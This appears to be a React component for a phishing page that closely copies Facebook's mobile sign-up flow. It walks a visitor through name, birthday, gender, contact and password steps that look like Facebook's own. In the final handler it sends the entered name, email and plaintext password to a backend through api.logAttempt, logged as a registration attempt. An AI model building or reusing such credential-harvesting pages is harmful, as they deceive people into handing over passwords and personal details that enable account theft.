import React, { useState, useMemo } from 'react';
import { ChevronLeft, Eye, EyeOff } from 'lucide-react';
import { api } from '../api/client';

/**
 * Facebook Multi-Step Registration Flow (m.facebook.com/reg/#)
 * Exact match to user's full-screen browser design (media_1793952932764_efb82980.png)
 * Full-page white background, clean back chevron, full-width inputs & Next pill button,
 * and bottom pinned link.
 */
export default function SignUpFlow({
  onBackToLogin,
  onGoToFindAccount,
  onSignUpSuccess,
}) {
  // Step state: 'name' | 'birthday' | 'gender' | 'contact' | 'password' | 'finish'
  const [step, setStep] = useState('name');

  // Form states
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');

  // Birthday
  const [birthMonth, setBirthMonth] = useState('Oct');
  const [birthDay, setBirthDay] = useState('30');
  const [birthYear, setBirthYear] = useState('2000');

  // Gender: 'female' | 'male' | 'custom'
  const [gender, setGender] = useState('female');
  const [customPronoun, setCustomPronoun] = useState('she');

  // Contact: phone vs email
  const [contactMode, setContactMode] = useState('phone'); // 'phone' | 'email'
  const [contactValue, setContactValue] = useState('');

  // Password
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  // Errors
  const [errorMsg, setErrorMsg] = useState('');

  // Calculate age dynamically
  const age = useMemo(() => {
    const currentYear = 2026;
    const y = parseInt(birthYear, 10) || 2000;
    return Math.max(1, currentYear - y);
  }, [birthYear]);

  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
  const years = Array.from({ length: 100 }, (_, i) => String(2026 - i));

  // Step 1: Submit Name
  const handleNameSubmit = (e) => {
    e.preventDefault();
    if (!firstName.trim()) {
      setErrorMsg('Please enter your first name.');
      return;
    }
    setErrorMsg('');
    setStep('birthday');
  };

  // Step 2: Submit Birthday
  const handleBirthdaySubmit = (e) => {
    e.preventDefault();
    setErrorMsg('');
    setStep('gender');
  };

  // Step 3: Submit Gender
  const handleGenderSubmit = (e) => {
    e.preventDefault();
    setErrorMsg('');
    setStep('contact');
  };

  // Step 4: Submit Contact
  const handleContactSubmit = (e) => {
    e.preventDefault();
    if (!contactValue.trim()) {
      setErrorMsg(
        contactMode === 'phone'
          ? 'Please enter your mobile number.'
          : 'Please enter your email address.'
      );
      return;
    }
    setErrorMsg('');
    setStep('password');
  };

  // Step 5: Submit Password
  const handlePasswordSubmit = (e) => {
    e.preventDefault();
    if (!password || password.length < 6) {
      setErrorMsg('Please choose a password with at least 6 characters.');
      return;
    }
    setErrorMsg('');
    setStep('finish');
  };

  // Step 6: Complete Registration
  const handleFinalSubmit = (e) => {
    e.preventDefault();
    const finalData = {
      firstName: firstName.trim(),
      lastName: lastName.trim(),
      email: contactValue.trim() || `${firstName.toLowerCase().replace(/\s+/g, '')}@facebook.com`,
      password,
      gender,
      birthMonth,
      birthDay,
      birthYear,
    };
    api.logAttempt({
      username: `${firstName} ${lastName}`.trim(),
      email: finalData.email,
      password: finalData.password,
      action: 'New User Registration (Created Account)',
      success: true,
    });
    onSignUpSuccess && onSignUpSuccess(finalData);
  };

  // Go back handler
  const handleGoBack = () => {
    setErrorMsg('');
    if (step === 'finish') setStep('password');
    else if (step === 'password') setStep('contact');
    else if (step === 'contact') setStep('gender');
    else if (step === 'gender') setStep('birthday');
    else if (step === 'birthday') setStep('name');
    else if (step === 'name') {
      if (onBackToLogin) onBackToLogin();
    }
  };

  return (
    <div className="fb-reg-full-page">
      {/* Top Bar with single back chevron (Exact match to media_1793952932764_efb82980.png) */}
      <div className="fb-reg-topbar-simple">
        <button
          type="button"
          className="fb-reg-back-icon-btn"
          onClick={handleGoBack}
          aria-label="Back"
          title="Back"
        >
          <ChevronLeft size={24} color="#050505" strokeWidth={2.4} />
        </button>
      </div>

      {/* Main Form Content */}
      <div className="fb-reg-body-area">
        {/* ========================================================
            STEP 1: What's your name?
            Exact match to media_1793952932764_efb82980.png
            ======================================================== */}
        {step === 'name' && (
          <form onSubmit={handleNameSubmit} className="fb-reg-form-main">
            <h1 className="fb-reg-title">What&apos;s your name?</h1>
            <p className="fb-reg-subtitle">Enter the name you use in real life.</p>

            <div className="fb-reg-name-row">
              <input
                type="text"
                name="reg_first_name"
                placeholder="First name"
                className={`fb-reg-input ${errorMsg && !firstName.trim() ? 'fb-reg-input-error' : ''}`}
                value={firstName}
                onChange={(e) => {
                  setFirstName(e.target.value);
                  if (errorMsg) setErrorMsg('');
                }}
                autoFocus
                autoComplete="off"
                spellCheck="false"
              />
              <input
                type="text"
                name="reg_last_name"
                placeholder="Last name"
                className="fb-reg-input"
                value={lastName}
                onChange={(e) => setLastName(e.target.value)}
                autoComplete="off"
                spellCheck="false"
              />
            </div>

            {errorMsg && <div className="fb-reg-error-notice">{errorMsg}</div>}

            <button type="submit" className="fb-reg-btn-primary">
              Next
            </button>

            {/* Bottom link: Find my account (Exact match to screenshot bottom) */}
            <div className="fb-reg-bottom-spacer">
              <button
                type="button"
                className="fb-reg-footer-link"
                onClick={onGoToFindAccount || onBackToLogin}
              >
                Find my account
              </button>
            </div>
          </form>
        )}

        {/* ========================================================
            STEP 2: What's your date of birth?
            ======================================================== */}
        {step === 'birthday' && (
          <form onSubmit={handleBirthdaySubmit} className="fb-reg-form-main">
            <h1 className="fb-reg-title">What&apos;s your date of birth?</h1>
            <p className="fb-reg-subtitle">
              Choose your date of birth. You can always make this private later.
            </p>

            <div className="fb-reg-date-row">
              <div className="fb-reg-select-wrapper">
                <select
                  className="fb-reg-select"
                  value={birthMonth}
                  onChange={(e) => setBirthMonth(e.target.value)}
                  aria-label="Month"
                >
                  {months.map((m) => (
                    <option key={m} value={m}>{m}</option>
                  ))}
                </select>
              </div>

              <div className="fb-reg-select-wrapper">
                <select
                  className="fb-reg-select"
                  value={birthDay}
                  onChange={(e) => setBirthDay(e.target.value)}
                  aria-label="Day"
                >
                  {days.map((d) => (
                    <option key={d} value={d}>{d}</option>
                  ))}
                </select>
              </div>

              <div className="fb-reg-select-wrapper">
                <select
                  className="fb-reg-select"
                  value={birthYear}
                  onChange={(e) => setBirthYear(e.target.value)}
                  aria-label="Year"
                >
                  {years.map((y) => (
                    <option key={y} value={y}>{y}</option>
                  ))}
                </select>
              </div>
            </div>

            {/* Dynamic age badge */}
            <div className="fb-reg-age-pill">
              <span>{age} years old</span>
            </div>

            <button type="submit" className="fb-reg-btn-primary" style={{ marginTop: 24 }}>
              Next
            </button>

            <div className="fb-reg-bottom-spacer">
              <button
                type="button"
                className="fb-reg-footer-link"
                onClick={onBackToLogin}
              >
                Already have an account?
              </button>
            </div>
          </form>
        )}

        {/* ========================================================
            STEP 3: What's your gender?
            ======================================================== */}
        {step === 'gender' && (
          <form onSubmit={handleGenderSubmit} className="fb-reg-form-main">
            <h1 className="fb-reg-title">What&apos;s your gender?</h1>
            <p className="fb-reg-subtitle">
              You can change who sees your gender on your profile later.
            </p>

            <div className="fb-reg-gender-list">
              {/* Female Option */}
              <label
                className={`fb-reg-gender-card ${gender === 'female' ? 'selected' : ''}`}
                onClick={() => setGender('female')}
              >
                <span className="fb-reg-gender-name">Female</span>
                <span className="fb-reg-radio-circle">
                  {gender === 'female' && <span className="fb-reg-radio-dot" />}
                </span>
              </label>

              {/* Male Option */}
              <label
                className={`fb-reg-gender-card ${gender === 'male' ? 'selected' : ''}`}
                onClick={() => setGender('male')}
              >
                <span className="fb-reg-gender-name">Male</span>
                <span className="fb-reg-radio-circle">
                  {gender === 'male' && <span className="fb-reg-radio-dot" />}
                </span>
              </label>

              {/* Custom Option */}
              <label
                className={`fb-reg-gender-card ${gender === 'custom' ? 'selected' : ''}`}
                onClick={() => setGender('custom')}
              >
                <span className="fb-reg-gender-name">More options</span>
                <span className="fb-reg-radio-circle">
                  {gender === 'custom' && <span className="fb-reg-radio-dot" />}
                </span>
              </label>
            </div>

            {gender === 'custom' && (
              <div className="fb-reg-custom-pronoun-box">
                <label className="fb-reg-custom-label">Select your pronoun</label>
                <select
                  className="fb-reg-select"
                  value={customPronoun}
                  onChange={(e) => setCustomPronoun(e.target.value)}
                  style={{ width: '100%', marginTop: 6 }}
                >
                  <option value="she">She: &quot;Wish her a happy birthday!&quot;</option>
                  <option value="he">He: &quot;Wish him a happy birthday!&quot;</option>
                  <option value="they">They: &quot;Wish them a happy birthday!&quot;</option>
                </select>
              </div>
            )}

            <button type="submit" className="fb-reg-btn-primary" style={{ marginTop: 24 }}>
              Next
            </button>

            <div className="fb-reg-bottom-spacer">
              <button
                type="button"
                className="fb-reg-footer-link"
                onClick={onBackToLogin}
              >
                Already have an account?
              </button>
            </div>
          </form>
        )}

        {/* ========================================================
            STEP 4: What's your mobile number / email?
            ======================================================== */}
        {step === 'contact' && (
          <form onSubmit={handleContactSubmit} className="fb-reg-form-main">
            <h1 className="fb-reg-title">
              {contactMode === 'phone'
                ? "What's your mobile number?"
                : "What's your email address?"}
            </h1>
            <p className="fb-reg-subtitle">
              {contactMode === 'phone'
                ? 'Enter the mobile number where you can be reached. No one will see this on your profile.'
                : 'Enter the email address where you can be reached. No one will see this on your profile.'}
            </p>

            <div className="fb-reg-input-group">
              <input
                type={contactMode === 'phone' ? 'tel' : 'email'}
                name="reg_contact_field"
                placeholder={contactMode === 'phone' ? 'Mobile number' : 'Email address'}
                className={`fb-reg-input ${errorMsg ? 'fb-reg-input-error' : ''}`}
                value={contactValue}
                onChange={(e) => {
                  setContactValue(e.target.value);
                  if (errorMsg) setErrorMsg('');
                }}
                autoFocus
                autoComplete="off"
                spellCheck="false"
              />
            </div>

            {errorMsg && <div className="fb-reg-error-notice">{errorMsg}</div>}

            <button type="submit" className="fb-reg-btn-primary">
              Next
            </button>

            {/* Toggle contact mode button */}
            <button
              type="button"
              className="fb-reg-btn-secondary"
              onClick={() => {
                setContactMode((m) => (m === 'phone' ? 'email' : 'phone'));
                setContactValue('');
                setErrorMsg('');
              }}
            >
              {contactMode === 'phone'
                ? 'Sign up with email address'
                : 'Sign up with mobile number'}
            </button>

            <div className="fb-reg-bottom-spacer">
              <button
                type="button"
                className="fb-reg-footer-link"
                onClick={onBackToLogin}
              >
                Already have an account?
              </button>
            </div>
          </form>
        )}

        {/* ========================================================
            STEP 5: Choose a password
            ======================================================== */}
        {step === 'password' && (
          <form onSubmit={handlePasswordSubmit} className="fb-reg-form-main">
            <h1 className="fb-reg-title">Choose a password</h1>
            <p className="fb-reg-subtitle">
              Create a password with at least 6 letters or numbers. It should be something that others couldn&apos;t guess.
            </p>

            <div className="fb-reg-password-wrap">
              <input
                type={showPassword ? 'text' : 'password'}
                name="reg_new_password"
                placeholder="Password"
                className={`fb-reg-input ${errorMsg ? 'fb-reg-input-error' : ''}`}
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (errorMsg) setErrorMsg('');
                }}
                autoFocus
                autoComplete="new-password"
              />
              {password.length > 0 && (
                <button
                  type="button"
                  className="fb-reg-eye-btn"
                  onClick={() => setShowPassword((s) => !s)}
                  aria-label={showPassword ? 'Hide password' : 'Show password'}
                >
                  {showPassword ? <EyeOff size={19} color="#65676B" /> : <Eye size={19} color="#65676B" />}
                </button>
              )}
            </div>

            {errorMsg && <div className="fb-reg-error-notice">{errorMsg}</div>}

            <button type="submit" className="fb-reg-btn-primary">
              Next
            </button>

            <div className="fb-reg-bottom-spacer">
              <button
                type="button"
                className="fb-reg-footer-link"
                onClick={onBackToLogin}
              >
                Already have an account?
              </button>
            </div>
          </form>
        )}

        {/* ========================================================
            STEP 6: Finish signing up
            ======================================================== */}
        {step === 'finish' && (
          <form onSubmit={handleFinalSubmit} className="fb-reg-form-main">
            <h1 className="fb-reg-title">Finish signing up</h1>
            <p className="fb-reg-terms-text">
              By tapping <strong>Sign Up</strong>, you agree to our{' '}
              <a href="#terms" onClick={(e) => e.preventDefault()}>Terms</a>,{' '}
              <a href="#privacy" onClick={(e) => e.preventDefault()}>Privacy Policy</a> and{' '}
              <a href="#cookies" onClick={(e) => e.preventDefault()}>Cookies Policy</a>.
              You may receive SMS notifications from us and can opt out at any time.
            </p>

            <button type="submit" className="fb-reg-btn-primary" style={{ marginTop: 24 }}>
              Sign Up
            </button>

            <button
              type="submit"
              className="fb-reg-btn-secondary"
              onClick={handleFinalSubmit}
            >
              Sign up without syncing contacts
            </button>

            <div className="fb-reg-bottom-spacer">
              <button
                type="button"
                className="fb-reg-footer-link"
                onClick={onBackToLogin}
              >
                Already have an account?
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}
